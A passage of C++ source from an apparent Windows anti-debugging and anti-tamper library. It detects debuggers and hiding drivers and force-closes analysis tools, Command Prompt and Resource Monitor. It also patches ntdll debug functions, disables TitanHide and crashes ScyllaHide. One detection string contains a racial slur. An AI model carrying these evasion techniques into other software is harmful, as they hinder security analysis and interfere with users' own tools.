                flag = Encrypt(1); HandleAttack(Encrypt("Triggering Trap Object #1"), Encrypt(1));
            }
            Lazy(VirtualFree).get()(Memory, Encrypt(0), MEM_RELEASE);
        }
    }
}

void NtSystemDebugControl_Command() 
{
    HMODULE hNtdll = Imports.get_module_handleA(Encrypt("ntdll.dll"));

    auto NtSystemDebugControl_ = reinterpret_cast<pNtSystemDebugControl>(Imports.get_proc_address(hNtdll, Encrypt("NtSystemDebugControl")));


    NTSTATUS status = NtSystemDebugControl_(SysDbgCheckLowMemory,  nullptr,0,nullptr,0, nullptr);

    if (status != STATUS_DEBUGGER_INACTIVE)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #13"), Encrypt(0));
    }
}


bool heapProtectionCheck() 
{
    HANDLE hHeap = GetProcessHeap();
    if (hHeap == nullptr) {
        return Encrypt(0);
    }

    PROCESS_HEAP_ENTRY heapEntry;
    heapEntry.lpData = nullptr; 

    while (HeapWalk(hHeap, &heapEntry))
    {
        if ((heapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) &&
            (heapEntry.lpData != nullptr)) 
        {
            if (heapEntry.cbData >= sizeof(DWORD))
            {
                DWORD* pData = reinterpret_cast<DWORD*>(heapEntry.lpData);
                if (*pData == Encrypt(0xABABABAB)) {
                    return Encrypt(1);
                }
            }
        }
    }

    return Encrypt(0);
}
void queryProcess()
{
    typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(IN HANDLE ProcessHandle,IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation,IN ULONG ProcessInformationLength,OUT PULONG ReturnLength );
    HMODULE hNtdll = Imports.load_library(Encrypt("ntdll.dll"));
    if (hNtdll) 
    {
        auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)Imports.get_proc_address(hNtdll, Encrypt("NtQueryInformationProcess"));

        if (pfnNtQueryInformationProcess) 
        {
            DWORD dwProcessDebugPort, dwReturned;
            NTSTATUS status = pfnNtQueryInformationProcess(Imports.get_current_process(),ProcessDebugPort,&dwProcessDebugPort, sizeof(DWORD),&dwReturned);

            if (NT_SUCCESS(status) && (Encrypt(-1) == dwProcessDebugPort))
            {
                flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #15"), Encrypt(0));
            }
        }
    }
}



void Process_Handles()
{
    typedef NTSTATUS(NTAPI* TNtQueryInformationProcess)(IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength);

    HMODULE hNtdll = Imports.load_library(Encrypt("ntdll.dll"));
    if (hNtdll)
    {
        auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)Imports.get_proc_address(hNtdll, Encrypt("NtQueryInformationProcess"));

        if (pfnNtQueryInformationProcess)
        {
            DWORD dwReturned;
            HANDLE hProcessDebugObject = 0;

            NTSTATUS status = pfnNtQueryInformationProcess(Imports.get_current_process(),(PROCESSINFOCLASS)Encrypt(0x1e),&hProcessDebugObject,sizeof(HANDLE),&dwReturned);

            if (NT_SUCCESS(status) && (0 != hProcessDebugObject))
            {
                flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #16"), Encrypt(0));
            }
        }
    }
    else
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Libary Tampering #1"), Encrypt(0));
    }
}

void CheckNtQueryInformationProcess()
{
    typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, UINT, PVOID, ULONG, PULONG);

    HMODULE ntdll = Imports.get_module_handleA(Encrypt("ntdll.dll"));
    if (!ntdll)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Libary Tampering #1"), Encrypt(0));
    }

    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)Imports.get_proc_address(ntdll, Encrypt("NtQueryInformationProcess"));

    if (!NtQueryInformationProcess)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Libary Tampering #1"),  Encrypt(0));
    }

    DWORD debuggerPresent = Encrypt(0);
    NTSTATUS status = NtQueryInformationProcess(Imports.get_current_process(), Encrypt(7), &debuggerPresent, sizeof(debuggerPresent), NULL);

    if (NT_SUCCESS(status) && debuggerPresent)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #17"), Encrypt(1));
    }
}

void CheckKernel32Breakpoints()
{
    BYTE* address = (BYTE*)Imports.get_proc_address(Imports.get_module_handleA(Encrypt("kernel32.dll")), Encrypt("CreateFileA"));

    if (*address == Encrypt(0xCC))
    { 
        flag = Encrypt(1); HandleAttack(Encrypt("Application Api Hooking"), Encrypt(0));
    }
}


secure auto simple_anti_debugger()
{
    BOOL debuggerPresent = FALSE;
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_CONTROL;
    MEMORY_BASIC_INFORMATION mbi = {};
    PVOID baseAddress = nullptr;
    My_PROCESS_BASIC_INFORMATION pbi = {};
    ULONG len = 0;
    SYSTEM_HANDLE_INFORMATION handleInfo;

    if (Imports.get_function<BOOL(*)()>(Encrypt("kernel32.dll"), Encrypt("IsDebuggerPresent"))())
    {
        Imports.exit_application();
    }

    if (Imports.get_function<BOOL(*)(HANDLE, PBOOL)>(Encrypt("kernel32.dll"), Encrypt("CheckRemoteDebuggerPresent"))(Imports.get_current_process(), &debuggerPresent) && debuggerPresent)
    {
        Imports.exit_application();
    }

    auto peb = reinterpret_cast<BYTE*>(__readgsqword(Encrypt(0x60)));
    if (peb && peb[Encrypt(0x2)])
    {
        Imports.exit_application();
    }

    auto ntGlobalFlag = *reinterpret_cast<DWORD*>(peb + Encrypt(0x68));
    if (ntGlobalFlag & Encrypt(0x70))
    {
        Imports.exit_application();
    }

    if (Imports.get_function<BOOL(*)(HANDLE, LPCONTEXT)>(Encrypt("kernel32.dll"), Encrypt("GetThreadContext"))(Imports.get_current_thread(), &ctx))
    {
        if (ctx.EFlags & Encrypt(0x100))
        {
            Imports.exit_application();
        }
    }

    if (Imports.get_function<NTSTATUS(*)(ULONG, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQuerySystemInformation"))(SystemHandleInformation, &handleInfo, sizeof(handleInfo), &len) == Encrypt(0))
    {
        for (ULONG i = 0; i < handleInfo.HandleCount; ++i)
        {
            if (handleInfo.Handles[i].ObjectTypeNumber == Encrypt(27))
            {
                Imports.exit_application();
            }
        }
    }

    if (Imports.get_function<NTSTATUS(*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"))(Imports.get_current_process(), ProcessBasicInformation, &pbi, sizeof(pbi), &len) == Encrypt(0))
    {
        if (pbi.PebBaseAddress && pbi.PebBaseAddress->BeingDebugged)
        {
            Imports.exit_application();
        }
    }


  
    if (flag) { __fastfail(Encrypt(0x99c)); }
}


extern "C" __declspec(noinline) void HookFunction();


void HideProcess()
{
    ULONG hide = 1; ULONG DebugFlags = 0x1;
    auto NtSetInformationProcess = Imports.get_function<NTSTATUS(*)(HANDLE, ULONG, PVOID, ULONG)>(Encrypt("ntdll.dll"), Encrypt("NtSetInformationProcess"));
    NtSetInformationProcess(Imports.get_current_process(), 0x29, &hide, sizeof(hide));
    NtSetInformationProcess(GetCurrentProcess(), 0x1F, &DebugFlags, sizeof(DebugFlags));
}



 auto disable_titan_hide()
{
    DWORD written = NULL;
    HIDE_INFO titan_hide;
    HANDLE driver_handle = nullptr;
    driver_handle = Lazy(CreateFileA).get()(Encrypt("\\\\.\\TitanHide"), GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    if (driver_handle == INVALID_HANDLE_VALUE) { return; }
    titan_hide.Command = UnhideAll;
    titan_hide.Pid = reinterpret_cast<HANDLE>(static_cast<uintptr_t>(Imports.get_current_process_id()));
    titan_hide.Type = Encrypt(0x3FF);
    Lazy(WriteFile).get()(driver_handle, &titan_hide, sizeof(titan_hide), &written, nullptr);
    Lazy(CloseHandle).get()(driver_handle);
}


secure auto Crash_Hide() // crashes scyllahide
{
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    disable_titan_hide();
    NTSTATUS nt_status = STATUS_UNSUCCESSFUL;
    uint32_t debug_flag = NULL;
    auto nt_set_informathion_process = Imports.get_function<pNtQueryInformationProcess>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));
    nt_status = reinterpret_cast<decltype(&NtSetInformationProcess)>(nt_set_informathion_process)(NtCurrentProcess, ProcessDebugFlags, reinterpret_cast<PVOID>(Encrypt(1)), sizeof(debug_flag));
    if (NT_SUCCESS(nt_status)) {}
}

void Initalize_Object()
{
    HANDLE hJob = Lazy(CreateJobObjectA).get()(NULL, NULL);
    JOBOBJECT_BASIC_LIMIT_INFORMATION limits;
    ZeroMemory(&limits, sizeof(limits));
    limits.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION extendedLimits;
    ZeroMemory(&extendedLimits, sizeof(extendedLimits));
    extendedLimits.BasicLimitInformation = limits;
    Lazy(SetInformationJobObject).get()(hJob, JobObjectExtendedLimitInformation, &extendedLimits, sizeof(extendedLimits));
    Lazy(AssignProcessToJobObject).get()(hJob, Imports.get_current_process());
}


int SearchForDlls(DWORD processID)
{
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

    hProcess = Lazy(OpenProcess).get()(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Encrypt(0), processID);
    if (NULL == hProcess)
        return Encrypt(1);

    if (K32EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
    {
        for (i = Encrypt(0); i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            TCHAR szModName[MAX_PATH];

            if (K32GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                TCHAR dllFileName[MAX_PATH];
                if (PathFindFileNameA(szModName) != NULL)
                {
                    strcpy_s(dllFileName, MAX_PATH, PathFindFileNameA(szModName));
                }

                std::vector<const TCHAR*> blacklisted = { (Encrypt(_T("x64dbg.dll"))), Encrypt(_T("tcc64-64.dll")), Encrypt(_T("tcc64-64.dll")), Encrypt(_T("ScyllaHideX64DBGPlugin.dp64")), Encrypt(_T("lfs.dll"))};
                for (const auto& targetDLL : blacklisted)
                {
                    if (_tcsstr(dllFileName, targetDLL) != NULL)
                    {
                        flag = Encrypt(1); HandleAttack(Encrypt("X64dbg"), Encrypt(1));
                    }
                }
            }
        }
    }
    CloseHandle(hProcess);

    return Encrypt(0);
}

bool ChangeNumberOfSections(string module, DWORD newSectionsCount)
{
    PIMAGE_SECTION_HEADER sectionHeader = 0;
    HINSTANCE hInst = NULL;
    PIMAGE_DOS_HEADER pDoH = 0;
    PIMAGE_NT_HEADERS64 pNtH = 0;

    hInst = Imports.get_module_handleA(module.c_str());

    pDoH = (PIMAGE_DOS_HEADER)(hInst);

    if (pDoH == NULL || hInst == NULL)
    {
        return Encrypt(0);
    }

    pNtH = (PIMAGE_NT_HEADERS64)((PIMAGE_NT_HEADERS64)((PBYTE)hInst + (DWORD)pDoH->e_lfanew));
    sectionHeader = IMAGE_FIRST_SECTION(pNtH);

    DWORD dwOldProt = Encrypt(0);

    if (!Imports.virtual_protect((LPVOID)&pNtH->FileHeader.NumberOfSections, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProt))
    {
        return Encrypt(0);
    }

    Imports.import_memcpy((void*)&pNtH->FileHeader.NumberOfSections, (void*)&newSectionsCount, sizeof(DWORD));

    if (!Imports.virtual_protect((LPVOID)&pNtH->FileHeader.NumberOfSections, sizeof(DWORD), dwOldProt, &dwOldProt)) 
    {
        return Encrypt(0);
    }

    return Encrypt(1);
}


void RemovePEHeader(HANDLE moduleBase)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDosHeader + (DWORD)pDosHeader->e_lfanew);

    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
        return;

    if (pNTHeader->FileHeader.SizeOfOptionalHeader)
    {
        DWORD Protect;
        WORD Size = pNTHeader->FileHeader.SizeOfOptionalHeader;
        Imports.virtual_protect((void*)moduleBase, Size, PAGE_EXECUTE_READWRITE, &Protect);
        RtlZeroMemory((void*)moduleBase, Size);
        Imports.virtual_protect((void*)moduleBase, Size, Protect, &Protect);
    }
}

void BreakDebuggers()
{
    try
    {
        DWORD processes[1024];
        DWORD cbNeeded;

        if (K32EnumProcesses(processes, sizeof(processes), &cbNeeded))
        {
            unsigned int cProcesses = cbNeeded / sizeof(DWORD);

            for (unsigned int i = Encrypt(0); i < cProcesses; i++)
            {
                try
                {
                    SearchForDlls(processes[i]);
                }
                catch (const std::exception& ex)
                {

                }
                catch (...)
                {

                }
            }
        }
    }
    catch (const std::exception& ex)
    {

    }
    catch (...)
    {

    }
}

auto Antidll()
{
    for (int i = Encrypt(0); i < Encrypt(200); ++i) { NoStepie(); }
    PROCESS_MITIGATION_ASLR_POLICY policyInfo;
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY PMCFGP{};
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY PMBSP{};
    PROCESS_MITIGATION_DEP_POLICY PMDP{};
    PROCESS_MITIGATION_IMAGE_LOAD_POLICY PMILP{};
    PROCESS_MITIGATION_STRICT_HANDLE_CHECK_POLICY handlePolicy = { Encrypt(0) };
    PROCESS_MITIGATION_FONT_DISABLE_POLICY fontDisablePolicy = { Encrypt(0) };
    policyInfo.EnableBottomUpRandomization = Encrypt(1);
    policyInfo.EnableForceRelocateImages = Encrypt(1);
    policyInfo.EnableHighEntropy = Encrypt(1);
    policyInfo.DisallowStrippedImages = Encrypt(0);
    PMCFGP.EnableControlFlowGuard = Encrypt(1);
    PMBSP.MicrosoftSignedOnly = Encrypt(1);
    PMCFGP.StrictMode = Encrypt(1);
    PMDP.Permanent = Encrypt(1);
    PMDP.Enable = Encrypt(1);
    PMILP.PreferSystem32Images = Encrypt(1);
    PMILP.NoRemoteImages = Encrypt(1);
    PMILP.NoLowMandatoryLabelImages = Encrypt(1);
    handlePolicy.RaiseExceptionOnInvalidHandleReference = Encrypt(1);
    handlePolicy.HandleExceptionsPermanentlyEnabled = Encrypt(1);
    fontDisablePolicy.DisableNonSystemFonts = Encrypt(1);
    SetProcessMitigationPolicy(ProcessASLRPolicy, &policyInfo, sizeof(policyInfo));
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &PMBSP, sizeof(PMBSP));
    SetProcessMitigationPolicy(ProcessImageLoadPolicy, &PMILP, sizeof(PMILP));
}

 auto unloadntdll()
{
    HANDLE process = Imports.get_current_process();
    MODULEINFO mi = {};
    HMODULE ntdllModule = Imports.get_module_handleA(Encrypt("ntdll.dll"));

    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = Lazy(CreateFileA).get()(Encrypt("c:\\windows\\system32\\ntdll.dll"), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, Encrypt(0), NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, Encrypt(0), Encrypt(0), NULL);
    LPVOID ntdllMappingAddress = Lazy(MapViewOfFile).get()(ntdllMapping, FILE_MAP_READ, Encrypt(0), Encrypt(0), Encrypt(0));

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = Encrypt(0); i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (Imports.import_strcmp((char*)hookedSectionHeader->Name, (char*)Encrypt(".text")))
        {
            DWORD oldProtection = Encrypt(0);
            bool isProtected = Imports.virtual_protect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            Imports.import_memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = Imports.virtual_protect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    Lazy(CloseHandle).get()(process);
    Lazy(CloseHandle).get()(ntdllFile);
    Lazy(CloseHandle).get()(ntdllMapping);
    Lazy(FreeLibrary).get()(ntdllModule);
}

 void ntdllcheck()
{
    called = called + Encrypt(1);
    if (called < Encrypt(15))
    {
        for (int i = Encrypt(0); i < Encrypt(15); ++i) { unloadntdll(); }
    }
}

 auto CheckOperatingSystem()
{
    bool SupportedSystem = Encrypt(0);
#ifdef _WIN64
    SupportedSystem = Encrypt(1);
#elif _WIN32
    SupportSystemed = Encrypt(1);
#else
    SupportSystemed = Encrypt(0);
#endif


    if (!SupportedSystem)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Unsupported OS"), Encrypt(0));
    }
}

BOOL CALLBACK codevault_Module(HWND hwnd, LPARAM lParam)
{
    std::vector<std::string> windowTitles = { Encrypt("hacker"), Encrypt("Resource Monitor"), Encrypt(") Properties"), Encrypt("dexz"), Encrypt("re-kit"), Encrypt("byte2mov"), Encrypt("Cheat Engine"), Encrypt("Command Prompt"), Encrypt("pssuspend"), Encrypt("sysinternals.com") };
    std::vector<std::string> windowClassNames = { Encrypt("ProcessHacker"), Encrypt("Qt5QWindowIcon"), Encrypt("WindowsForms10.Window.8.app.0.378734a"), Encrypt("MainWindowClassName"), Encrypt("BrocessRacker") };

    DWORD processId;
    char wndTitle[256];
    char wndClassName[256];
    Lazy(GetWindowThreadProcessId).get()(hwnd, &processId);
    DWORD id = Imports.get_current_process_id();
    Lazy(GetWindowTextA).get()(hwnd, wndTitle, sizeof(wndTitle));
    Lazy(GetClassNameA).get()(hwnd, wndClassName, sizeof(wndClassName));

    std::string windowTitle = wndTitle;
    std::string windowClassName = wndClassName;

    for (const auto& title : windowTitles) {
        if (windowTitle.find(title) != std::string::npos)
        {
            if (windowTitle == Encrypt("re-kit") || windowTitle == Encrypt("byte2mov"))
            {
                flag = Encrypt(1); HandleAttack(Encrypt("Api hooking"), Encrypt(1));
            }
            Lazy(SendMessageA).get()(hwnd, (WM_CLOSE), Encrypt(0), Encrypt(0)); // dont lazy will crash
            return Encrypt(1);
        }
    }

    for (const auto& className : windowClassNames)
    {
        if (windowClassName.find(className) != std::string::npos)
        {
            if (processId != id)
            {
                Lazy(SendMessageA).get()(hwnd, (WM_CLOSE), Encrypt(0), Encrypt(0)); // dont lazy will crash
                return Encrypt(1);
            }
        }
    }

    return Encrypt(1);
}

secure auto DetectProcessHacker()
{
    std::vector<const wchar_t*> Events =
    {
        Encrypt(L"Global\\ProcessHacker")
    };

    for (const auto& Handle : Events)
    {
        HANDLE eventHandle = Lazy(OpenEventW).get()(EVENT_ALL_ACCESS, Encrypt(0), Handle);
        DWORD dwError = Lazy(GetLastError).get()();
        if (dwError == ERROR_INVALID_HANDLE || dwError == ERROR_SUCCESS)
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Processhacker"), Encrypt(0));
        }
    }
}

bool driverdetect()
{
    const TCHAR* devices[] =
    {
        (Encrypt(_T("\\\\.\\kdstinker"))),
        (Encrypt(_T("\\\\.\\NiGgEr"))),
        (Encrypt(_T("\\\\.\\KsDumper"))),
        (Encrypt(_T("\\\\.\\HyperHideDrv")))
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = Lazy(CreateFileA).get()(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            return Encrypt(1);
        }
    }

    return Encrypt(0);
}



LONG WINAPI ExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
    return EXCEPTION_EXECUTE_HANDLER; // Continue execution
}

bool Patch_Bytes()
{
    SetUnhandledExceptionFilter(ExceptionHandler);
    using GetModuleHandleAType = HMODULE(WINAPI*)(LPCSTR);
    HMODULE kernel32 = Imports.load_library(Encrypt("kernel32.dll"));
    auto getModuleHandleA = (GetModuleHandleAType)Imports.get_proc_address(kernel32, Encrypt("GetModuleHandleA"));
    HMODULE ntdll = getModuleHandleA(Encrypt("ntdll.dll"));
    using DbgBreakPointType = UINT64(*)();
    auto dbgBreakPoint = (DbgBreakPointType)Imports.get_proc_address(ntdll, Encrypt("DbgBreakPoint"));
    auto dbgUiRemoteBreakin = (DbgBreakPointType)Imports.get_proc_address(ntdll, Encrypt("DbgUiRemoteBreakin"));

    DWORD dwOldProt = Encrypt(0);

    if (dbgBreakPoint)
    {
        if (Imports.virtual_protect((LPVOID)dbgBreakPoint, Encrypt(1), PAGE_EXECUTE_READWRITE, &dwOldProt))
        {
            *(BYTE*)dbgBreakPoint = Encrypt(0xC3); // Replace with RET instruction
            Imports.virtual_protect((LPVOID)dbgBreakPoint, Encrypt(1), dwOldProt, &dwOldProt);
        }
    }

    if (dbgUiRemoteBreakin)
    {
        if (Imports.virtual_protect((LPVOID)dbgUiRemoteBreakin, Encrypt(1), PAGE_EXECUTE_READWRITE, &dwOldProt))
        {
            *(BYTE*)dbgUiRemoteBreakin = Encrypt(0xC3); // Replace with RET instruction
            Imports.virtual_protect((LPVOID)dbgUiRemoteBreakin, Encrypt(1), dwOldProt, &dwOldProt);
        }
    }

    Lazy(FreeLibrary).get()(kernel32);
    return Encrypt(1);
}


DWORD GetModuleSize(HMODULE hModule)
{
    if (hModule == NULL)
    {
        return Encrypt(0);
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(Imports.get_current_process(), hModule, &moduleInfo, sizeof(moduleInfo)))
    {
        Encrypt(0);
    }

    DWORD moduleSize = moduleInfo.SizeOfImage;
    return moduleSize;
}


 void VerifyTLSCallback()
{
    HMODULE hModule = Imports.get_module_handleA(NULL);
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)dosHeader + dosHeader->e_lfanew);

    IMAGE_TLS_DIRECTORY* tlsDir = (IMAGE_TLS_DIRECTORY*)((BYTE*)hModule + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

    HMODULE MainModule = Imports.get_module_handleA (NULL);
    UINT32 ModuleSize = GetModuleSize(MainModule);

    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == Encrypt(0))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Application Tls Tampering #1"), Encrypt(1));
    }

    if ((UINT64)tlsDir < (UINT64)MainModule || (UINT64)tlsDir >(UINT64)((UINT64)MainModule + ModuleSize)) 
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Application Tls Tampering #1"), Encrypt(1));
    }

    PIMAGE_TLS_CALLBACK* pTLSCallbacks = (PIMAGE_TLS_CALLBACK*)tlsDir->AddressOfCallBacks;

    int tlsCount = Encrypt(0);

    for (int i = Encrypt(0); pTLSCallbacks[i] != nullptr; i++)
    {
        if (!pTLSCallbacks)
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Application Tls Tampering #1"), Encrypt(1));
        }

        if ((UINT64)pTLSCallbacks[i] < (UINT64)MainModule || (UINT64)pTLSCallbacks[i] > (UINT64)((UINT64)MainModule + ModuleSize)) 
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Application Tls Tampering #1"), Encrypt(1));
        }

        tlsCount++;
    }

    if (tlsCount == Encrypt(0))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Application Tls Tampering #1"), Encrypt(1));
    }
}

 BOOL QueryInfoDetect()
 {
     DWORD dwDebugPort{};

     auto NtQuerySystemInformation = Imports.get_function<NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQuerySystemInformation"));
     auto NtQueryInformationProcess = Imports.get_function<NTSTATUS(*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));

     if (NtQueryInformationProcess)
     {
         NtQueryInformationProcess(Imports.get_current_process(), ProcessDebugPort, &dwDebugPort, sizeof(dwDebugPort), NULL);
         if (dwDebugPort != Encrypt(0))
         {
             return true;
         }
     }

     DWORD dwObjectHandle{};
     if (NtQueryInformationProcess)
     {
         NtQueryInformationProcess(Imports.get_current_process(), ProcessDebugObjectHandle, &dwObjectHandle, sizeof(dwObjectHandle), NULL);
         if (dwObjectHandle != Encrypt(0))
         {
             return true;
         }
     }

     DWORD dwDebugFlags{};
     if (NtQueryInformationProcess)
     {
         NtQueryInformationProcess(Imports.get_current_process(), ProcessDebugFlags, &dwDebugFlags, sizeof(dwDebugFlags), NULL);
         if (dwDebugFlags == Encrypt(0))
         {
             return true;
         }
     }

     WOW64_CONTEXT ctx{};
     auto NtQueryInformationThread = Imports.get_function<NTSTATUS(*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG)>(
         Encrypt("ntdll.dll"), Encrypt("NtQueryInformationThread"));

     if (NtQueryInformationThread) 
     {
         NtQueryInformationThread(Imports.get_current_thread(), ThreadWow64Context, &ctx, sizeof(WOW64_CONTEXT), NULL);
         if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7)
         {
             return true;
         }
     }

     return false;
 }


 BOOL DebugObjectDetect_All()
 {
     ULONG objSize{};
     auto NtQueryObject = Imports.get_function<NTSTATUS(*)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryObject"));

     if (NtQueryObject)
     {
         NtQueryObject(NULL, ObjectAllInformation, &objSize, sizeof(ULONG), &objSize);
     }

     PVOID p_Memory = Imports.virtual_alloc(NULL, objSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (p_Memory == NULL) {
         return false;
     }

     if (NtQueryObject && NtQueryObject(NULL, ObjectAllInformation, p_Memory, objSize, NULL) != Encrypt(0)) 
     {
         Lazy(VirtualFree).get()(p_Memory, Encrypt(0), MEM_RELEASE);
         return true;
     }

     POBJECT_ALL_INFORMATION p_ObjectAllInfo = (POBJECT_ALL_INFORMATION)p_Memory;
     PUCHAR p_ObjInfoLocation = (PUCHAR)p_ObjectAllInfo->ObjectTypeInformation;

     for (UINT i = 0; i < p_ObjectAllInfo->NumberOfObjects; i++) 
     {
         POBJECT_TYPE_INFORMATION p_ObjectTypeInfo = (POBJECT_TYPE_INFORMATION)p_ObjInfoLocation;

         auto TypeName = p_ObjectTypeInfo->TypeName.Buffer;
         if (wcscmp((Encrypt(L"DebugObject")), TypeName) == Encrypt(0))
         {
             if (p_ObjectTypeInfo->TotalNumberOfObjects > Encrypt(0))
             {
                 Lazy(VirtualFree).get()(p_Memory, Encrypt(0), MEM_RELEASE);
                 return true;
             }
         }

         p_ObjInfoLocation = (PUCHAR)p_ObjectTypeInfo->TypeName.Buffer;
         p_ObjInfoLocation += p_ObjectTypeInfo->TypeName.MaximumLength;

         ULONG_PTR tmp = ((ULONG_PTR)p_ObjInfoLocation) & -(int)sizeof(void*);
         if ((ULONG_PTR)tmp != (ULONG_PTR)p_ObjInfoLocation) {
             tmp += sizeof(void*);
         }

         p_ObjInfoLocation = (unsigned char*)tmp;
     }

     if (p_Memory) 
     {
         Lazy(VirtualFree).get()(p_Memory, Encrypt(0), MEM_RELEASE);
     }

     return false;
 }

secure void Wait(int time)
{
    std::mutex mtx;
    std::unique_lock<std::mutex> lock(mtx);
    std::condition_variable cv;
    cv.wait_for(lock, std::chrono::milliseconds(time));
}



secure auto CheckDebugger(bool thread)
{
    if (thread)
    {
        if (flag == Encrypt(1)) { __fastfail(Encrypt(0x99)); *((volatile int*)nullptr) = Encrypt(0x99); } if (start2 > Encrypt(0)) { if (Imports.get_tick_count64() - start2 > 15000 && !authorized) { HandleAttack(Encrypt("codevault_Protect Not Called Within 15s Of Fake Entrypoint Running"), Encrypt(0)); } }
        if (CheckBan() && tls_ran) { HandleAttack(Encrypt("Blacklisted From codevault"), Encrypt(1)); }
        if (DebugObjectDetect_All()) { HandleAttack(Encrypt("Debug Object #21"), Encrypt(1)); } if (QueryInfoDetect()) { HandleAttack(Encrypt("Debug Object #22"), Encrypt(1)); }
        VerifyTLSCallback(); if (IsHyperHideDebuggingProcess()) { flag = Encrypt(1); HandleAttack(Encrypt("Hyperhide #1"), Encrypt(1)); } if (driverdetect()) { flag = Encrypt(1); HandleAttack(Encrypt("Hyperhide #2"), Encrypt(0)); }
